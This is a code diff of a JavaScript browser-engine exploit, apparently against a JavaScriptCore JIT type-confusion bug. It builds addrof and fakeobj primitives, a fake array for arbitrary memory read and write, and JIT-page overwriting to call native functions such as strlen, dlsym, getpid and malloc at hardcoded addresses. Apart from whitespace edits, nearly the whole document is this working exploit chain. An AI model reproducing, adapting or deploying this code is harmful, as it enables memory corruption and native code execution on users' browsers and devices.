@@ -32,12 +32,12 @@ function addrofOnce(obj){
     confuse[0] = 1.1;
     let trigger = false;
     const b = new Base();
-
+    
     Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
     b.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = obj; return false;} });
-
+    
     function jitme(a, flag) {
-        a[0] = 1.1; 
+        a[0] = 1.1;
         a[1] = 2.2;
         if(flag) {
             [...arr];
@@ -61,12 +61,12 @@ function fakeobjOnce(addr){
     confuse[1] = 1.1;
     let trigger = 0;
     const b2 = new Base();
-
+    
     Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
     b2.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = {}; return false; } });
-
+    
     function jitme(a, flag, f64arr, u32arr) {
-        a[0] = 1.1; 
+        a[0] = 1.1;
         a[1] = 2.2;
         if(flag) {
             [...arr];
@@ -78,14 +78,14 @@ function fakeobjOnce(addr){
         u32arr[2] = addr;
         a[1] = f64arr[1];
     }
-
+    
     let u32arr = new Uint32Array(4);
     let f64arr = new Float64Array(u32arr.buffer);
     
     for(var i = 0; i < 0x100000; i++){
         jitme(confuse, false, f64arr, u32arr); // JITting...
     }
-
+    
     trigger = 1;
     arr[0] = b2.prototype;
     jitme(confuse, true, f64arr, u32arr);
@@ -98,12 +98,12 @@ function addrofOnce2(obj){
     confuse[0] = 1.1;
     let trigger = false;
     const b = new Base();
-
+    
     Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
     b.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = obj; return false;} });
-
+    
     function jitme(a, flag) {
-        a[0] = 1.1; 
+        a[0] = 1.1;
         a[1] = 2.2;
         if(flag) {
             [...arr];
@@ -127,12 +127,12 @@ function fakeobjOnce2(addr){
     confuse[1] = 1.1;
     let trigger = 0;
     const b2 = new Base();
-
+    
     Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
     b2.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = {}; return false; } });
-
+    
     function jitme(a, flag, f64arr, u32arr) {
-        a[0] = 1.1; 
+        a[0] = 1.1;
         a[1] = 2.2;
         if(flag) {
             [...arr];
@@ -144,14 +144,14 @@ function fakeobjOnce2(addr){
         u32arr[2] = addr;
         a[1] = f64arr[1];
     }
-
+    
     let u32arr = new Uint32Array(4);
     let f64arr = new Float64Array(u32arr.buffer);
     
     for(var i = 0; i < 0x100000; i++){
         jitme(confuse, false, f64arr, u32arr); // JITting...
     }
-
+    
     trigger = 1;
     arr[0] = b2.prototype;
     jitme(confuse, true, f64arr, u32arr);
@@ -162,7 +162,7 @@ const buf = new ArrayBuffer(8);
 const f64 = new Float64Array(buf);
 const u32 = new Uint32Array(buf);
 
-function f2i(val) { 
+function f2i(val) {
     f64[0] = val;
     return u32[1] * 0x100000000 + u32[0];
 }
@@ -243,58 +243,58 @@ function MakeJitCompiledFunction() {
 
 function millis(ms)
 {
-	var t1 = Date.now();
+    var t1 = Date.now();
     while(Date.now() - t1 < ms)
     {
-    	//Simply wait
+        //Simply wait
     }
 }
 
 var shellcodeFunc = MakeJitCompiledFunction();
 
 function pwn() {
-
+    
     let noCoW = 13.37;
     var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
     let structureID = LeakStructureID(arrLeak);
     log("[+] leak structureID: "+(structureID));
-
+    
     pad = [{}, {}, {}];
     var victim = [noCoW, 14.47, 15.57];
     victim['prop'] = 13.37;
     victim['prop_1'] = 13.37;
-
+    
     u32[0] = structureID;
     u32[1] = 0x01082309-0x20000;
-
+    
     var container = {
         cellHeader: f64[0],
-        butterfly: victim   
+        butterfly: victim
     };
-
+    
     // build fake driver
     var containerAddr = addrofOnce2(container);
     var fakeArrAddr = Add(containerAddr, 0x10);
     var driver = fakeobjOnce2(fakeArrAddr);
-
+    
     // ArrayWithDouble
     var unboxed = [noCoW, 13.37, 13.37];
     // ArrayWithContiguous
     var boxed = [{}];
-
+    
     // leak unboxed butterfly's addr
     driver[1] = unboxed;
     var sharedButterfly = victim[1];
     log("[+] shared butterfly addr: " + Int64.fromDouble(sharedButterfly));
-
+    
     driver[1] = boxed;
     victim[1] = sharedButterfly;
-
+    
     // set driver's cell header to double array
     u32[0] = structureID;
     u32[1] = 0x01082307-0x20000;
     container.cellHeader = f64[0];
-
+    
     function addrof(obj) {
         boxed[0] = obj;
         return f2i(unboxed[0]);
@@ -302,9 +302,9 @@ function pwn() {
     
     function fakeobj(addr) {
         unboxed[0] = i2f(addr);
-        return boxed[0];            
-    }    
-
+        return boxed[0];
+    }
+    
     function read64(addr) {
         driver[1] = i2f(addr+0x10);
         return addrof(victim.prop);
@@ -314,7 +314,7 @@ function pwn() {
         driver[1] = i2f(addr+0x10);
         victim.prop = i2f(val);
     }
-
+    
     function ByteToDwordArray(payload)
     {
         let sc = []
@@ -336,15 +336,15 @@ function pwn() {
         }
         return sc;
     }
-
-    function ArbitraryWrite(addr, payload) 
+    
+    function ArbitraryWrite(addr, payload)
     {
         let sc = ByteToDwordArray(payload);
         for(let i=0; i<sc.length; i++) {
             write64(addr+i*6, sc[i]);
         }
     }
-
+    
     let arbCallBytes = new Uint8Array([
         0x00, 0x00, 0x00, 0x10,
         0x11, 0x24, 0x40, 0xF9,
@@ -386,6 +386,19 @@ function pwn() {
     log(`[+] JITCode @ ${JITCode.toString(16)}`);
     ArbitraryWrite(JITCode, arbCallBytes);
     
+    // method 1, requires NULL terminated string. eg. "exit\0"
+    // function getStringAddress(str) {
+    //    return read64(addrof(str) + 0x8) + 20;
+    // }
+    
+    // method 2
+    function getStringAddress(str) {
+        let encoder = new TextEncoder();
+        let byteArray = encoder.encode(str);
+        byteArray = new Uint8Array([...byteArray, 0]);
+        return read64(addrof(byteArray) + 0x10);
+    }
+    
     // function to make an arbitrary call
     function arbCall(func, ...args) {
         if (args.length > 9) {
@@ -395,39 +408,37 @@ function pwn() {
         log(`[+] func: 0x${func.toString(16)}`);
         arrayView.setBigUint64(0x0, BigInt(func), true);
         for (let i = 0; i < args.length; i++) {
-            log(`[+] x${i}: 0x${args[i].toString(16)}`);
-            arrayView.setBigUint64(16 + (i * 8), BigInt(args[i]), true);
+            let arg = args[i];
+            let value;
+            switch (typeof arg) {
+                case 'string':
+                    value = BigInt(getStringAddress(arg));
+                    break;
+                default:
+                    value = BigInt(arg);
+            }
+            //log(`[+] x${i}: 0x${value.toString(16)}`);
+            arrayView.setBigUint64(16 + (i * 8), value, true);
         }
         shellcodeFunc();
         for (let i = 0; i < 9; i++) arrayView.setBigUint64(16 + (i * 8), 0n, true);
         return arrayView.getBigUint64(0x8, true);
     }
     
-    let testString = "exit\0\0\0\0";
-    let testStringAddr = addrof(testString);
-    
-    log(`[+] testStringAddr = 0x${testStringAddr.toString(16)}`);
-    
-    let testAddr = read64(testStringAddr + 0x8)
-    
-    log(`[+] testAddr = 0x${testAddr.toString(16)}`);
-
-    log(`[+] 0x${read64(testAddr + 20).toString(16)}`);
-    
     // call strlen
-    alert(`[+] strlen ret = ${arbCall(0x1daf7af20, testAddr + 20)}`);
+    alert(`[+] strlen ret = ${arbCall(0x1daf7af20, "exit")}`);
     
     // call dlsym
-    alert(`[+] dlsym ret = 0x${arbCall(0x18039e2b8, -2, testAddr + 20).toString(16)}`);
+    alert(`[+] dlsym ret = 0x${arbCall(0x18039e2b8, -2, "exit").toString(16)}`);
     
-//
-//    //arbCall(0x4142434445464748n, 0x41n, 0x42n, 0x43n, 0x44n, 0x45n, 0x46n, 0x47n, 0x48n, 0x49n);
-//    
-//    let pid = arbCall(0x1babf715c); // getpid()
-//    log(`[+] pid = ${pid}`);
-//    alert(`[+] pid = ${pid}`);
-//    
-//    let buf = arbCall(0x1918c5280, 10); // malloc(10)
-//    log(`[+] buf = 0x${buf.toString(16)}`);
-//    alert(`[+] buf = 0x${buf.toString(16)}`);
+    
+    // arbCall(0x4142434445464748n, 0x41n, 0x42n, 0x43n, 0x44n, 0x45n, 0x46n, 0x47n, 0x48n, 0x49n);
+    
+    let pid = arbCall(0x1babf715c); // getpid()
+    log(`[+] pid = ${pid}`);
+    alert(`[+] pid = ${pid}`);
+    
+    let buf = arbCall(0x1918c5280, 10); // malloc(10)
+    log(`[+] buf = 0x${buf.toString(16)}`);
+    alert(`[+] buf = 0x${buf.toString(16)}`);
 }
